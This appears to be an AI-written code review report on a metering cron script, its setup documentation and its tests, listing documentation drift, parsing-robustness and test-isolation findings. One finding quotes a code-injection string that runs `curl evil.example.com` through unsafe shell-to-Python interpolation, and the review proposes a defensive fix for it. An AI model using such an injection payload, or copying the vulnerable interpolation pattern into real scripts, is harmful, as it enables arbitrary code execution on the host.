---
phase: 04-wire-enrichment
reviewed: 2026-05-14T00:00:00Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - skills/revenium/scripts/hermes-report.sh
  - skills/revenium/references/setup.md
  - tests/test_repository.py
findings:
  blocker: 1
  warning: 3
  info: 3
  total: 7
status: issues_found
---

# Phase 4: Code Review Report

**Reviewed:** 2026-05-14T00:00:00Z
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

Phase 4 wires three pieces of enrichment onto the marker-driven Revenium meter call:
(1) `--operation-type CHAT` on the zero-marker fallthrough (WIRE-01),
(2) `--agent` passthrough from marker `agent` field with `Hermes` fallback (WIRE-02),
(3) `--trace-id` passthrough from marker `trace_id` field with `${sid}` fallback (WIRE-03).
It also adds an 8-provider regression test (WIRE-04) and pins documentation about per-marker
attribution semantics (D-25).

The code change is small, structurally correct, and the test coverage is excellent:
the pipe-field count parity (Python emits 11 fields, bash `read` declares 11) is
correct, conservation/idempotency invariants are preserved, and the new tests use proper
tempfile teardown.

The principal defects are documentation-versus-code drift (the setup.md attribution
paragraph still says "no `--operation-type`" on the zero-marker fallthrough — directly
contradicting WIRE-01), and two robustness concerns in the new pipe-row protocol:
no validation that marker `agent` / `trace_id` are pipe-safe (the comment-only "MUST NOT
contain '|'" is unenforced), and no rejection of embedded newlines that would silently
split one marker row into two `read` iterations.

## Critical Issues

### BL-01: setup.md "no `--operation-type`" contradicts WIRE-01

**File:** `skills/revenium/references/setup.md:82`
**Issue:** The "How attribution works" paragraph still states that the zero-marker
fallthrough emits a call "with `--task-type unclassified` and no `--operation-type` —
argv-compatible with the pre-Phase-3 single-call form so backward-compat installs keep
metering unchanged." This was true before Phase 4. After WIRE-01 the zero-marker
fallthrough now emits `--operation-type CHAT` (hermes-report.sh:637), and the test
`test_cron_marker_split_end_to_end` was flipped to *assert* that value. This is a
load-bearing documentation lie sitting in the operator-facing setup reference,
right next to the new D-25 paragraph that the same phase added. The "argv-compatible"
claim is also now false — Phase 4 deliberately broke pre-Phase-3 argv parity on the
fallthrough path. The setup.md change was incomplete relative to the hermes-report.sh
change.

**Fix:**
```diff
- When a session window has zero markers (legacy install, missing marker file, all lines unparseable), the cron falls through to a single call with `--task-type unclassified` and no `--operation-type` — argv-compatible with the pre-Phase-3 single-call form so backward-compat installs keep metering unchanged.
+ When a session window has zero markers (legacy install, missing marker file, all lines unparseable), the cron falls through to a single call with `--task-type unclassified` and `--operation-type CHAT`. Revenium analytics treat `CHAT` as the server-side default operation type, so backward-compat installs continue to meter with no behavior change versus the documented v1 wire contract (D-22 / WIRE-01).
```

## Warnings

### WR-01: marker `agent` / `trace_id` pipe-safety is comment-only, unenforced

**File:** `skills/revenium/scripts/hermes-report.sh:527-533`
**Issue:** The new `split_rows` heredoc reads `m_agent = marker.get('agent', '')`
and `m_trace = marker.get('trace_id', '')` from arbitrary JSON content and emits them
into a pipe-delimited row consumed by the bash `while IFS='|' read -r ... m_agent m_trace`
loop on line 550. A literal `|` in `agent` (today's classifier does not write the
field, but Phase 6 plugin or any future writer might) silently corrupts field
alignment: `m_trace` will absorb everything past the 10th pipe and the actual
`trace_id` is lost. A literal `\n` is even worse — bash sees two rows: the first
truncated, the second with `muid=""` (silently skipped by line 551), losing
the call entirely. The inline comment on line 529 acknowledges this but
relies on a social contract ("today's only values are pipe-safe fallbacks per
D-23") rather than runtime defense. This is exactly the class of bug the bash
`-uo pipefail` soft-fail mode is intended to surface; today it fails silently.

**Fix:** Sanitize at the Python emission boundary. Either reject the row (emit
nothing for that marker so the next tick retries) or strip the offending characters
with a logged warning:
```python
def _safe(s: str) -> str:
    # Replace newlines and pipes with U+FFFD so the pipe-row protocol stays
    # parseable. Caller observes the substitution in the log line.
    return s.replace('|', '�').replace('\n', '�').replace('\r', '�')

m_agent = _safe(marker.get('agent', ''))
m_trace = _safe(marker.get('trace_id', ''))
```
Alternatively, switch the protocol from `|`-delimited to NUL-delimited
(`print('\0'.join(...))` + `read -d '' -r ...`) which removes the
forbidden-character class entirely for typical marker values. Either change should
land with a unit test that feeds a marker containing `|` and `\n` and asserts
the cron either skips it cleanly or strips deterministically.

### WR-02: dead `local row` declaration in marker-emission loop

**File:** `skills/revenium/scripts/hermes-report.sh:549`
**Issue:** Line 549 declares `local row muid t_type op_type ...`. The variable
`row` is never written or read anywhere inside the `while` loop on line 550.
This is unused noise from an earlier iteration of the protocol that read whole
lines into `row` first; the current code reads directly into the field
variables via `IFS='|' read -r`. Pre-existing before Phase 4 but the same loop
was modified in this phase (added `m_agent m_trace`), so it is a fair clean-up
target now.

**Fix:**
```diff
-      local row muid t_type op_type d_in d_out d_cr d_cw d_tot d_cost m_agent m_trace
+      local muid t_type op_type d_in d_out d_cr d_cw d_tot d_cost m_agent m_trace
```

### WR-03: `test_wire_no_provider_regression_per_class` ledger / state.db not cleaned between subTests

**File:** `tests/test_repository.py:2813-2910`
**Issue:** The 8-provider loop creates a *fresh* `tempfile.mkdtemp` per subTest
(`tmpdir = tempfile.mkdtemp(prefix='gsd-wire-provider-e2e-')`) and tears it down
in `finally`. That part is correct. But each subTest re-runs the cron with
`HERMES_HOME` set to the brand-new `hermes_home` path *inside* this tmpdir, and
inherits `os.environ` via `**os.environ`. If a developer runs this test with
`HERMES_HOME`, `REVENIUM_STATE_DIR`, `REVENIUM_MARKERS_DIR`, or
`REVENIUM_TAXONOMY_FILE` already exported in their shell, the env override only
covers `HERMES_HOME` and `REVENIUM_STATE_DIR` — the other two (which `common.sh`
honors) leak through and could point at the developer's real `~/.hermes`
state. The existing classifier tests use `_setup_plugin_env` /
`_restore_plugin_env` for exactly this reason. This is a pre-existing pattern
shared with `test_cron_marker_split_end_to_end` and `test_wire_agent_trace_passthrough`,
but Phase 4 added two new instances of the un-scrubbed pattern, doubling the
exposure surface.

**Fix:** Either (a) explicitly clear the four `REVENIUM_*` envs in `base_env`
before merging `os.environ`:
```python
base_env = {
    **{k: v for k, v in os.environ.items()
       if k not in ('REVENIUM_MARKERS_DIR', 'REVENIUM_MARKERS_READY_DIR',
                    'REVENIUM_TAXONOMY_FILE')},
    'HOME': shim_home,
    'HERMES_HOME': hermes_home,
    'REVENIUM_STATE_DIR': state_dir,
    # ...
}
```
or (b) factor a `_setup_cron_env` helper analogous to `_setup_plugin_env` and
use it from all three end-to-end tests.

## Info

### IN-01: `agent` / `trace_id` marker fields not yet written by the classifier plugin

**File:** `skills/revenium/scripts/hermes-report.sh:527-528, 567, 569`
**Issue:** The marker schema in `skills/revenium/plugins/revenium-classifier/classifier.py:296-320`
(`_write_marker_pair`) emits the 5 required keys (`muid`, `ts`, `sid`, `task_type`,
`operation_type`) and nothing else. Today no production marker writer populates
`agent` or `trace_id`, so the positive sub-case in `test_wire_agent_trace_passthrough`
is the only path that exercises the non-fallback branch. The wire support is correct
and the fallback is the steady-state for v1. Worth a one-line note in `setup.md` or a
TODO comment in the heredoc so a future reader understands the marker reader and the
marker writer disagree on schema. (Marker schema in `references/task-taxonomy.md`
may also need a `agent` / `trace_id` "optional fields" line if not already present.)

**Fix:** Add a comment near hermes-report.sh:527:
```python
# NOTE: as of Phase 6, the classifier plugin does NOT write 'agent' or
# 'trace_id'. These reads exist for forward-compatibility with multi-agent
# Hermes deployments where a turn carries an explicit attribution tuple.
# All production rows currently hit the bash :- fallback on lines 567 / 569.
```

### IN-02: pre-existing Python heredoc shell-interpolation of `${model}` and `${billing_provider}` is a latent code-injection seam

**File:** `skills/revenium/scripts/hermes-report.sh:215, 225-226, 274, 282, 290-291`
**Issue:** Not introduced by Phase 4 but exercised by the new WIRE-04 test matrix:
the `clean_model` and `provider` heredocs interpolate raw `${model}` and
`${billing_provider}` directly into Python source as `model = '${model}'`. A
session row in `state.db` whose `model` column contains a literal single quote
breaks Python syntax — the script falls through to `|| echo "${model}"` and
keeps running, so today's robustness story is "fail-open to legacy model name."
But a maliciously-crafted `model` like
`x'; import os; os.system('curl evil.example.com'); '` runs as Python in the
cron's authentication context. Hermes owns `state.db` and the threat model
appears to assume that DB is trusted; flagging only because the new test
exercises this exact codepath across 8 providers and one of the new test
cases (`openrouter-special`) includes a `/` in the model name (no quote, so
safe today, but illustrates how quickly the input space widens).

**Fix:** Replace the `'${model}'` / `'${billing_provider}'` interpolation
pattern with environment-variable handoff (the same shape already used by
the marker-emit and split heredocs):
```bash
clean_model=$(MODEL="${model}" python3 - <<'PY' 2>/dev/null || echo "${model}"
import os
model = os.environ['MODEL']
if '/' in model:
    model = model.split('/', 1)[1]
for prefix in ('global.', 'anthropic.', 'openai.', 'google.', 'x-ai.'):
    if model.startswith(prefix):
        model = model[len(prefix):]
print(model)
PY
)
```
Apply the same transformation to the `provider`, `request_time`, `response_time`,
`duration_ms`, and `delta_cost` heredocs.

### IN-03: setup.md uses "the agent" interchangeably with the on_session_end plugin in the new D-25 paragraph

**File:** `skills/revenium/references/setup.md:86`
**Issue:** The newly-added line "When markers carry different `agent` or `trace_id`
values across a session, each Revenium meter call records the per-turn attribution;
per-session aggregation happens dashboard-side." uses `agent` ambiguously — readers
have to infer from context whether this means *the marker field* `agent` (which
the cron passes through to `--agent`) or *the agent process* writing markers
(Hermes / classifier plugin). Two paragraphs up, "the agent writes into each
marker line" refers to the latter sense. The Phase 4 PR-text discusses both
senses without a glossary.

**Fix:** Disambiguate, e.g.:
```diff
- When markers carry different `agent` or `trace_id` values across a session, each Revenium meter call records the per-turn attribution; per-session aggregation happens dashboard-side.
+ When markers carry different values in their `agent` or `trace_id` JSON fields across a session (multi-agent / sub-agent dispatch), each Revenium meter call records the per-turn attribution via `--agent` and `--trace-id` argv; per-session aggregation happens dashboard-side.
```

---

_Reviewed: 2026-05-14T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
